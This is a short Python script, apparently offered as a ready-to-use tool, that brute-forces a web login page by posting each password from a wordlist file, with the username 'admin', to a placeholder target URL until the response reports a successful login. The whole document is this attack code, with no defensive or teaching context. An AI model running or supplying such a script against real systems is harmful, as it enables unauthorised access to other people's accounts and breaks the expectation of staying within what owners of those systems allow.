import requests

url = "https://target_website.com/login.php"
user = "admin"
passwords_file = "passwords.txt"

with open(passwords_file) as file:
    for line in file:
        password = line.strip()
        response = requests.post(url, data={"user": user, "password": password})
        if "Login successful" in response.text:
            print("Password found:", password)
            break
